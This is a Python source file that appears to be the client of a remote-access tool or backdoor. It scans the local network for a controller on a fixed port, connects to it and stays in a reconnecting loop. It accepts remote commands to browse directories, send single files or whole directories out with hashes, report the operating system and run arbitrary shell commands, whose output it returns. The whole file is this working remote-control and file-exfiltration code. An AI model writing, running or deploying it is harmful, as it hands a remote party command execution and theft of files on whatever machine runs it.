import os
import subprocess
import threading
import time
from hashlib import sha256
from pathlib import Path
from socket import *

clientSocket = socket(AF_INET, SOCK_STREAM)
try:
    current_ip = gethostbyname('DESKTOP-DJ15UQ2.local')
except Exception as e:
    try:
        current_ip = gethostbyname('DESKTOP-DJ15UQ2')
    except Exception as e:
        current_ip = ''
local_ip = ''
connected = False
server_port = 34561
current_path = Path.home()
slash = '/' if os.name != 'nt' else '\\'


def ls():
    print('List directory requested')
    list_dir = os.walk(current_path)
    for root, dirs, files in list_dir:
        for dir in dirs:
            clientSocket.send(dir.encode())
            time.sleep(0.1)

        clientSocket.send('/'.encode())

        for file in files:
            clientSocket.send(file.encode())
            time.sleep(0.1)

        clientSocket.send('.'.encode())
        break


def cdup():
    print('Change to parent directory requested')
    global current_path
    try:
        current_path = Path(current_path).parent
        clientSocket.send(str(current_path).encode())
    except Exception:
        clientSocket.send('Path not found'.encode())


def cdhome():
    global current_path
    print('Change directory to home requested')
    current_path = Path.home()
    clientSocket.send(str(current_path).encode())


def cd():
    global current_path
    print('Join directory requested')
    path = clientSocket.recv(1024).decode()
    try:
        if os.path.exists(str(current_path) + slash + path):
            current_path = str(current_path) + slash + path
            os.chdir(current_path)
            clientSocket.send(current_path.encode())
        else:
            raise FileNotFoundError
    except Exception:
        print('Path not found')
        clientSocket.send('Path not found'.encode())


def pwd():
    print('Working directory requested')
    clientSocket.send(str(current_path).encode())


def get():
    print('Get file requested')
    file_name = clientSocket.recv(1024).decode()
    print('Downloading file ' + file_name)
    send(file_name)


def getall():
    print('Get directory file requested')
    list_dir = os.walk(current_path)
    for root, dirs, files in list_dir:
        for file in files:
            clientSocket.send(file.encode())
            if not send(file):
                time.sleep(0.1)
                clientSocket.sendall('.'.encode())
                return

            time.sleep(0.1)
            if clientSocket.recv(1024).decode() == 'ok':
                continue
        time.sleep(0.1)
        clientSocket.sendall('.'.encode())
        break


def send(fname):
    try:
        if not os.path.exists(str(current_path) + slash + fname):
            print('File not found')
            clientSocket.send('File not found'.encode())
            return False

        file = open(fname, 'rb')
        file_size = os.path.getsize(fname)
        file_hash = sha256(open(fname, 'rb').read()).hexdigest()
        clientSocket.send(str(file_size).encode())
        clientSocket.recv(1024).decode()
        clientSocket.send(str(file_hash).encode())
        clientSocket.recv(1024).decode()
        data = file.read()
        clientSocket.sendall(data)
        file.close()
        return True
    except Exception:
        print('Permission denied')
        clientSocket.send('Permission denied'.encode())
        return False


def terminalsniffer(cmd):
    try:
        p = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, encoding='utf-8',
                             errors='replace')
        try:
            output, error = p.communicate(timeout=10)
            if error:
                clientSocket.sendall(error.encode())
            else:
                clientSocket.sendall(output.encode())

            time.sleep(0.1)
            clientSocket.send('ok'.encode())
        except Exception as e:
            p.kill()
            clientSocket.sendall(str(e).encode())
            clientSocket.send('ok'.encode())
    except Exception as e:
        clientSocket.sendall(str(e).encode())
        clientSocket.send('ok'.encode())


def command():
    print('Subprocess requested')
    command = clientSocket.recv(1024).decode()
    try:
        t = threading.Thread(target=terminalsniffer, args=(command,))
        t.start()
    except Exception as e:
        clientSocket.sendall(str(e).encode())
        clientSocket.send('ok'.encode())


def platform():
    print('Platform requested')
    getos = os.name
    if getos == 'nt':
        clientSocket.send('Windows'.encode())
    elif getos == 'posix':
        clientSocket.send('Linux'.encode())
    else:
        clientSocket.send('Unknown'.encode())


switcher = {
    'ls': ls,
    'pwd': pwd,
    'get': get,
    'getall': getall,
    'cdup': cdup,
    'cdhome': cdhome,
    'cd': cd,
    'command': command,
    'platform': platform}


def master():
    global clientSocket, current_ip, local_ip, connected

    if os.name == 'posix':
        cmd = "ip route get 1.2.3.4 | awk '{print $7}'"
        local_ip = subprocess.check_output(cmd, shell=True).decode().strip()
        local_ip = local_ip.rsplit('.', 1)[0] + '.'
    else:
        local_ip = gethostbyname(gethostname())
        local_ip = local_ip.rsplit('.', 1)[0] + '.'

    while not connected:
        if current_ip == '':
            print('Scanning for server...')
            for i in range(2, 255):
                ip = local_ip + str(i)
                print('Trying ' + ip)
                if clientSocket.connect_ex((ip, server_port)) == 0:
                    print('Connected to ' + ip)
                    connected = True
                    current_ip = ip
                    break
        else:
            print('Trying to reconnect to ' + current_ip)
            for i in range(1, 10):
                time.sleep(2)
                if (clientSocket.connect_ex((current_ip, server_port))) == 0:
                    connected = True
                    print('Reconnected to ' + current_ip)
                    break
                else:
                    print('Failed to reconnect to ' + current_ip)
                    clientSocket.close()
                    clientSocket = socket(AF_INET, SOCK_STREAM)
        current_ip = ''

    while connected:
        try:
            command = clientSocket.recv(1024).decode()
            if command in switcher.keys() and command != '':
                print('Command received: ', command)
                switcher[command]()
        except Exception:
            print('Server disconnected')
            connected = False
            clientSocket.close()
            clientSocket = socket(AF_INET, SOCK_STREAM)


if __name__ == '__main__':
    while True:
        t = threading.Thread(target=master)
        if not t.is_alive():
            t.start()
        t.join()
        time.sleep(0.1)
